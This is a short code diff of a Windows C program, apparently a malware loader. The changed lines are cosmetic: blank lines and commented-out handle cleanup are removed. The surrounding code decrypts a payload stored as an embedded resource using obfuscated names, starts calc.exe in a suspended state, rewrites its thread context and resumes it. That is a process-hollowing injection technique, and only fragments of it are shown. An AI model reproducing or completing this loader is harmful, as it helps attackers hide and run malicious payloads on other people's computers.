@@ -14,7 +14,6 @@ void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
-    
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
@@ -33,8 +32,6 @@ int main() {
     si.cb = sizeof(si);
     CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
-
-    
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
@@ -48,10 +45,6 @@ int main() {
     SetThreadContext(pi.hThread, &ctx);
 
     ResumeThread(pi.hThread); 
-
-    
-    //CloseHandle(pi.hThread);
-    //CloseHandle(pi.hProcess);
 
     return 0;
 }
